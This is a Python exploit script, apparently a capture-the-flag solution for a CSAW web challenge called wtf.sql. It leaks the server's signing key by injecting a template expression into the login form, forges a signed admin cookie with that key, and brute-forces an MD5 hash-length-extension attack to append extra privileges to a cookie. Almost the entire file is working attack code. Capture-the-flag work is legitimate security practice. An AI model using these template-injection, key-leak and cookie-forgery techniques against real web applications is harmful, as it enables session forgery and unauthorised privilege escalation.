import requests
from pwn import *

url = "http://web.chal.csaw.io:3306"

failresp = repr(u'<html>\n    <head>\n        <title>wtf.sql</title>\n        <link rel="stylesheet" type="text/css" href="/static/style.css">\n    </head>\n    <body>\n        <div class="header">\n            <img src="/static/wtf_sql.png" />\n        </div>\n\n        Site stats:\n        00\n    </body>\n</html>\n')

def extend(append, l):
    r = process(["./hash_extender", "-d", '', "-s", "60f0cc64f5b633cf502d25ea561a98bf", "-a", append, "-f", "md5", "-l", str(l)], level="error")
    r.readline()
    r.readline()
    new_sig = r.readline().strip().split(": ")[1]
    extended = r.readline().strip().split(": ")[1]
    return (new_sig, extended.decode('hex'))



def get_signed_sha2(st):
    key = leak_signing_key()
    return hashlib.sha256(st + key).hexdigest() + st.encode('hex')


def get_admin_cookie():
    return get_signed_sha2("1")

def get_privs_cookie(guesslen):
    signme = ''.join(extend(";panel_create;panel_view;", guesslen))
    signme = signme
    signed_privs = get_signed_sha2(signme)
    priv_cookie = signed_privs
    return priv_cookie

def leak_signing_key():
    s = requests.Session()
    r = s.post(url + "/login", {"email":"${config_signing_key}", "password":"asd"})
    return str(r.text.split("Hello, ")[1].split("</")[0])


cookies = {}

s = requests.Session()

email = '1'
username = '1'


print "[+] Registering"
r = s.post(url + "/register", {"email":email, "name":username, "password":"asd"})
print "[+] Registered\n"


print "[+] Logging in"
r = s.post(url + "/login", {"email":email, "password":"asd"})
print "[+] Logged in\n"


print "[+] Get admin cookie"
for i in s.cookies:
    if i.name == "admin":
        i.value = get_admin_cookie()
print "[+] Set admin cookie\n"


print "[+] Requesting admin page"
r = s.get(url + "/admin")
if not "Site stats" in r.text:
    print "[+] Not admin?"
    print r.text
    exit(1)

print "[+] We're admin\n"


for ext_len in xrange(32):
    print "[+] Setting privs"
    for i in s.cookies:
        if i.name == "privs":
            i.value = get_privs_cookie(ext_len)
    print "[+] Set privs\n"


    print "[+] Requesting admin page again"
    r = s.get(url + "/admin")
    if not "Site stats" in r.text:
        print "[+] Not admin?"
        exit(1)

    print "[+] We're admin still\n"


    if not repr(r.text) == failresp:
        print "[+] WAIT WE GOT SOMETHING"
        print r.text
        print get_privs_cookie(ext_len)
        exit(0)
    else:
        print "[+] Nope\n"
